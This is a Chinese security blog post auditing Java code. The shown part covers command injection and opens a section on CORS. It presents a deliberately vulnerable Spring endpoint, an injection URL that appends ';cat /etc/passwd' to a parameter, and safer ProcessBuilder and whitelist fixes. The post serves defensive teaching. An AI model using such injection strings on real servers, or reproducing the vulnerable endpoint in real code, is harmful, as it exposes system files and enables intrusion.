<!DOCTYPE html>
<html lang=zh>
<head>
  <meta charset="utf-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="renderer" content="webkit">
  <meta http-equiv="Cache-Control" content="no-transform" />
  <meta http-equiv="Cache-Control" content="no-siteapp" />
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="format-detection" content="telephone=no,email=no,adress=no">
  <!-- Color theme for statusbar -->
  <meta name="theme-color" content="#000000" />
  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
  <meta http-equiv="window-target" content="_top" />
  
  
  <title>Java-Sec-Code | Erickin的博客</title>
  <meta name="description" content="Command Inject错误示例123456789@GetMapping(&quot;&#x2F;codeinject&quot;)    public String codeInject(String filepath) throws IOException &#123;        String[] cmdList &#x3D; new String[]&#123;&quot;sh&quot;, &amp;quot">
<meta property="og:type" content="article">
<meta property="og:title" content="Java-Sec-Code">
<meta property="og:url" content="https://erickinyae.github.io/2023/11/13/Java-Sec-Code/index.html">
<meta property="og:site_name" content="Erickin">
<meta property="og:description" content="Command Inject错误示例123456789@GetMapping(&quot;&#x2F;codeinject&quot;)    public String codeInject(String filepath) throws IOException &#123;        String[] cmdList &#x3D; new String[]&#123;&quot;sh&quot;, &amp;quot">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2023-11-13T07:49:13.000Z">
<meta property="article:modified_time" content="2023-11-23T07:05:55.691Z">
<meta property="article:author" content="Erickin">
<meta property="article:tag" content="代码审计">
<meta name="twitter:card" content="summary">
  <!-- Canonical links -->
  <link rel="canonical" href="https://erickinyae.github.io/2023/11/13/Java-Sec-Code/index.html">
  
    <link rel="alternate" href="/atom.xml" title="Erickin" type="application/atom+xml">
  
  
    <link rel="icon" href="/safe.png" type="image/x-icon">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  
  
  
<meta name="generator" content="Hexo 7.0.0"></head>


<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
  <div class="slimContent">
    <div class="navbar-header">
      
      
      <div class="profile-block text-center">
        <a id="avatar" href="https://github.com/ErickinYae" target="_blank">
          <img class="img-circle img-rotate" src="/images/icon.png" width="200" height="200">
        </a>
        <h2 id="name" class="hidden-xs hidden-sm">Erickin</h2>
        <h3 id="title" class="hidden-xs hidden-sm hidden-md">脚本小子</h3>
        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Shanghai, China</small>
      </div>
      
      <div class="search" id="search-form-wrap">

    <form class="search-form sidebar-form">
        <div class="input-group">
            <input type="text" class="search-form-input form-control" placeholder="搜索" />
            <span class="input-group-btn">
                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
            </span>
        </div>
    </form>
    <div class="ins-search">
  <div class="ins-search-mask"></div>
  <div class="ins-search-container">
    <div class="ins-input-wrapper">
      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
    </div>
    <div class="ins-section-wrapper">
      <div class="ins-section-container"></div>
    </div>
  </div>
</div>


</div>
      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
    </div>
    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
      <ul class="nav navbar-nav main-nav menu-highlight">
        
        
        <li class="menu-item menu-item-home">
          <a href="/.">
            
            <i class="icon icon-home-fill"></i>
            
            <span class="menu-title">首页</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-archives">
          <a href="/archives">
            
            <i class="icon icon-archives-fill"></i>
            
            <span class="menu-title">归档</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-categories">
          <a href="/categories">
            
            <i class="icon icon-folder"></i>
            
            <span class="menu-title">分类</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-tags">
          <a href="/tags">
            
            <i class="icon icon-tags"></i>
            
            <span class="menu-title">标签</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-repository">
          <a href="/repository">
            
            <i class="icon icon-project"></i>
            
            <span class="menu-title">项目</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-about">
          <a href="/about">
            
            <i class="icon icon-cup-fill"></i>
            
            <span class="menu-title">关于</span>
          </a>
        </li>
        
      </ul>
      
	
    <ul class="social-links">
    	
        <li><a href="https://github.com/ErickinYae" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
        
    </ul>

    </nav>
  </div>
</header>

  
    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
  <div class="slimContent">
    
      
  <div class="widget">
    <h3 class="widget-title">分类</h3>
    <div class="widget-body">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%90%8E%E7%AB%AF/">后端</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91/">开发</a><span class="category-list-count">1</span></li></ul>
    </div>
  </div>


    
      
  <div class="widget">
    <h3 class="widget-title">标签</h3>
    <div class="widget-body">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CI-CD/" rel="tag">CI\CD</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80/" rel="tag">基础</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%A1%E8%AE%A1/" rel="tag">审计</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a><span class="tag-list-count">1</span></li></ul>
    </div>
  </div>


    
      
  <div class="widget">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget-body">
      <ul class="recent-post-list list-unstyled no-thumbnail">
        
          <li>
            
            <div class="item-inner">
              <p class="item-category">
                <a class="category-link" href="/categories/%E5%BC%80%E5%8F%91/">开发</a>
              </p>
              <p class="item-title">
                <a href="/2023/11/23/java/" class="title">java</a>
              </p>
              <p class="item-date">
                <time datetime="2023-11-23T03:33:00.000Z" itemprop="datePublished">2023-11-23</time>
              </p>
            </div>
          </li>
          
          <li>
            
            <div class="item-inner">
              <p class="item-category">
                <a class="category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
              </p>
              <p class="item-title">
                <a href="/2023/11/20/%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/" class="title">威胁建模</a>
              </p>
              <p class="item-date">
                <time datetime="2023-11-20T01:22:37.000Z" itemprop="datePublished">2023-11-20</time>
              </p>
            </div>
          </li>
          
          <li>
            
            <div class="item-inner">
              <p class="item-category">
                <a class="category-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a>
              </p>
              <p class="item-title">
                <a href="/2023/11/17/problem-resolved/" class="title">problem-resolved</a>
              </p>
              <p class="item-date">
                <time datetime="2023-11-17T07:13:06.000Z" itemprop="datePublished">2023-11-17</time>
              </p>
            </div>
          </li>
          
          <li>
            
            <div class="item-inner">
              <p class="item-category">
                <a class="category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
              </p>
              <p class="item-title">
                <a href="/2023/11/13/Java-Sec-Code/" class="title">Java-Sec-Code</a>
              </p>
              <p class="item-date">
                <time datetime="2023-11-13T07:49:13.000Z" itemprop="datePublished">2023-11-13</time>
              </p>
            </div>
          </li>
          
          <li>
            
            <div class="item-inner">
              <p class="item-category">
                <a class="category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
              </p>
              <p class="item-title">
                <a href="/2023/11/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="title">渗透测试</a>
              </p>
              <p class="item-date">
                <time datetime="2023-11-13T00:51:31.000Z" itemprop="datePublished">2023-11-13</time>
              </p>
            </div>
          </li>
          
      </ul>
    </div>
  </div>
  

    
  </div>
</aside>

  
  
  <aside class="sidebar sidebar-toc collapse   in  " id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
  <div class="slimContent">
    <nav id="toc" class="article-toc">
      <h3 class="toc-title">文章目录</h3>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Command-Inject"><span class="toc-number">1.</span> <span class="toc-text">Command Inject</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.0.1.</span> <span class="toc-text">错误示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><span class="toc-number">1.0.2.</span> <span class="toc-text">注入方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E4%BB%A3%E7%A0%81"><span class="toc-number">1.0.3.</span> <span class="toc-text">安全代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CORS"><span class="toc-number">2.</span> <span class="toc-text">CORS ?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF"><span class="toc-number">3.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81"><span class="toc-number">3.0.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E4%BB%A3%E7%A0%81-1"><span class="toc-number">3.0.2.</span> <span class="toc-text">安全代码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Cors-checkOrigin"><span class="toc-number">3.0.2.1.</span> <span class="toc-text">Cors.checkOrigin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#spring-security"><span class="toc-number">3.0.2.2.</span> <span class="toc-text">spring security</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#filter"><span class="toc-number">3.0.2.3.</span> <span class="toc-text">filter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BaseCorsFilter"><span class="toc-number">3.0.2.4.</span> <span class="toc-text">BaseCorsFilter</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Deserialize"><span class="toc-number">4.</span> <span class="toc-text">Deserialize</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A5%E4%B8%8B%E6%98%AF%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E8%88%AC%E5%8E%9F%E7%90%86%E5%92%8C%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">4.0.1.</span> <span class="toc-text">以下是序列化漏洞的一般原理和过程：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E8%8C%83%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8E%AA%E6%96%BD%E5%8C%85%E6%8B%AC%EF%BC%9A"><span class="toc-number">4.0.2.</span> <span class="toc-text">防范序列化漏洞的措施包括：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE"><span class="toc-number">5.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cmd%E6%B3%A8%E5%85%A5"><span class="toc-number">5.1.</span> <span class="toc-text">cmd注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%B9%E6%B3%95"><span class="toc-number">5.1.1.</span> <span class="toc-text">敏感方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81-1"><span class="toc-number">5.1.2.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E4%BB%A3%E7%A0%81-2"><span class="toc-number">5.1.3.</span> <span class="toc-text">安全代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#js%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5"><span class="toc-number">5.2.</span> <span class="toc-text">js脚本注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%B9%E6%B3%95-1"><span class="toc-number">5.2.1.</span> <span class="toc-text">敏感方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81-2"><span class="toc-number">5.2.2.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E4%BB%A3%E7%A0%81-3"><span class="toc-number">5.2.3.</span> <span class="toc-text">安全代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#yaml%E6%B3%A8%E5%85%A5"><span class="toc-number">5.3.</span> <span class="toc-text">yaml注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%B9%E6%B3%95-2"><span class="toc-number">5.3.1.</span> <span class="toc-text">敏感方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81-3"><span class="toc-number">5.3.2.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E4%BB%A3%E7%A0%81-4"><span class="toc-number">5.3.3.</span> <span class="toc-text">安全代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#groovyshell%E6%B3%A8%E5%85%A5"><span class="toc-number">5.4.</span> <span class="toc-text">groovyshell注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%B9%E6%B3%95-3"><span class="toc-number">5.4.1.</span> <span class="toc-text">敏感方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81-4"><span class="toc-number">5.4.2.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E4%BB%A3%E7%A0%81-5"><span class="toc-number">5.4.3.</span> <span class="toc-text">安全代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cookie"><span class="toc-number">6.</span> <span class="toc-text">Cookie</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%B9%E6%B3%95-4"><span class="toc-number">6.0.1.</span> <span class="toc-text">敏感方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81-5"><span class="toc-number">6.0.2.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E4%BB%A3%E7%A0%81-6"><span class="toc-number">6.0.3.</span> <span class="toc-text">安全代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CRLF"><span class="toc-number">7.</span> <span class="toc-text">CRLF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81-6"><span class="toc-number">7.0.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E4%BB%A3%E7%A0%81-7"><span class="toc-number">7.0.2.</span> <span class="toc-text">安全代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fastjson"><span class="toc-number">8.</span> <span class="toc-text">Fastjson</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">9.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%B9%E6%B3%95-5"><span class="toc-number">9.0.1.</span> <span class="toc-text">敏感方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81-7"><span class="toc-number">9.0.2.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E4%BB%A3%E7%A0%81-8"><span class="toc-number">9.0.3.</span> <span class="toc-text">安全代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IP%E5%9C%B0%E5%9D%80%E8%8E%B7%E5%8F%96"><span class="toc-number">10.</span> <span class="toc-text">IP地址获取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%B9%E6%B3%95-6"><span class="toc-number">10.0.1.</span> <span class="toc-text">敏感方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81-8"><span class="toc-number">10.0.2.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E4%BB%A3%E7%A0%81-9"><span class="toc-number">10.0.3.</span> <span class="toc-text">安全代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#jdbc-postgresql%E6%BC%8F%E6%B4%9E"><span class="toc-number">11.</span> <span class="toc-text">jdbc-postgresql漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0"><span class="toc-number">11.0.1.</span> <span class="toc-text">敏感函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81-9"><span class="toc-number">11.0.2.</span> <span class="toc-text">漏洞代码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload"><span class="toc-number">11.0.2.1.</span> <span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#base64%E8%A7%A3%E7%A0%81"><span class="toc-number">11.0.2.2.</span> <span class="toc-text">base64解码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-xml"><span class="toc-number">11.0.2.3.</span> <span class="toc-text">1.xml</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">11.0.3.</span> <span class="toc-text">修复</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#jsonp%E6%BC%8F%E6%B4%9E"><span class="toc-number">12.</span> <span class="toc-text">jsonp漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JSONP%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">12.1.</span> <span class="toc-text">JSONP工作原理：</span></a></li></ol></li></ol>
    </nav>
  </div>
</aside>

<main class="main" role="main">
  <div class="content">
  <article id="post-Java-Sec-Code" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
    
    <div class="article-header">
      
        
  
    <h1 class="article-title" itemprop="name">
      Java-Sec-Code
    </h1>
  

      
      <div class="article-meta">
        <span class="article-date">
    <i class="icon icon-calendar-check"></i>
	<a href="/2023/11/13/Java-Sec-Code/" class="article-date">
	  <time datetime="2023-11-13T07:49:13.000Z" itemprop="datePublished">2023-11-13</time>
	</a>
</span>
        
  <span class="article-category">
    <i class="icon icon-folder"></i>
    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
  </span>

        
  <span class="article-tag">
    <i class="icon icon-tags"></i>
	<a class="article-tag-link-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>
  </span>


        

	<span class="article-read hidden-xs">
    	<i class="icon icon-eye-fill" aria-hidden="true"></i>
    	<span id="/2023/11/13/Java-Sec-Code/" class="leancloud_visitors"  data-flag-title="Java-Sec-Code">0</span>
    </span>

        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/11/13/Java-Sec-Code/#comments" class="article-comment-link">评论</a></span>
        
	
		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 7.7k(字)</span>
	
	
		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 35(分)</span>
	

      </div>
    </div>
    <div class="article-entry marked-body" itemprop="articleBody">
      
        <h1 id="Command-Inject"><a href="#Command-Inject" class="headerlink" title="Command Inject"></a>Command Inject</h1><h3 id="错误示例"><a href="#错误示例" class="headerlink" title="错误示例"></a>错误示例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/codeinject&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">codeInject</span><span class="params">(String filepath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        String[] cmdList = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ls -la &quot;</span> + filepath&#125;;</span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmdList);</span><br><span class="line">        builder.redirectErrorStream(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> builder.start();</span><br><span class="line">        <span class="keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>在该代码中，get请求可以携带一个参数filepath，但方法并未对filepath做任何过滤操作而直接进行字符串拼串进行执行，从而会导致代码注入；</li>
<li>注入的方法是在原有的语句结尾，添加一个 <code>;</code>，从而再接上一段语句进行执行；</li>
</ul>
<h3 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/codeinject?filepath=/tmp;cat /etc/passwd</span><br></pre></td></tr></table></figure>

<ul>
<li>该请求将导致<code>ls -la /tmp; cat /etc/passwd</code>执行。</li>
</ul>
<blockquote>
<p><code>sh -c</code>的意思是调取命令执行窗口执行命令。</p>
</blockquote>
<h3 id="安全代码"><a href="#安全代码" class="headerlink" title="安全代码"></a>安全代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/codeinject&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">codeInject</span><span class="params">(String filepath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>();</span><br><span class="line">        builder.command(<span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-la&quot;</span>, filepath);</span><br><span class="line">        builder.redirectErrorStream(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> builder.start();</span><br><span class="line">        <span class="keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>用户输入被添加到<code>ProcessBuilder</code>的命令列表中，而不是直接插入到命令字符串中。<code>ProcessBuilder</code>会处理参数的转义和引用，确保它们在系统命令中被正确解释；</li>
<li>如果用户输入包含空格等特殊字符，<code>ProcessBuilder</code>会负责正确处理，而不会使它们被错误地解释为命令的一部分。这有助于防止命令注入攻击。</li>
<li>总体而言，使用<code>ProcessBuilder</code>并正确处理命令和参数是防范命令注入的一种有效方式；</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">FILTER_PATTERN</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;^[a-zA-Z0-9_/\\.-]+$&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// SecurityUtil.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">cmdFilter</span><span class="params">(String input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!FILTER_PATTERN.matcher(input).matches()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> input;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/codeinject&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">codeInject</span><span class="params">(String filepath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">		<span class="type">String</span> <span class="variable">filterFilePath</span> <span class="operator">=</span> SecurityUtil.cmdFilter(filepath);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> == filterFilePath) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Bad boy. I got u.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmdList = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ls -la &quot;</span> + filepath&#125;;</span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmdList);</span><br><span class="line">        builder.redirectErrorStream(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> builder.start();</span><br><span class="line">        <span class="keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>通过对字符串进行过滤也能有效处理代码注入问题。</li>
</ul>
<h1 id="CORS"><a href="#CORS" class="headerlink" title="CORS ?"></a>CORS ?</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/JoyChou93/java-sec-code/wiki/CORS">https://github.com/JoyChou93/java-sec-code/wiki/CORS</a></p>
</blockquote>
<p>CORS（跨域资源共享）是一种用于在浏览器和服务器之间进行跨域通信的机制。当在浏览器中执行Web页面时，由于安全原因，浏览器限制了从一个域（Origin）加载的网页能够请求另一个域上的资源。跨域请求是指在浏览器的同一页面中，从一个域的JavaScript代码尝试请求另一个域的资源，例如，从<code>http://domain-a.com</code>的页面尝试向<code>http://domain-b.com</code>发起请求。</p>
<blockquote>
<p>详细解释：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS</a></p>
</blockquote>
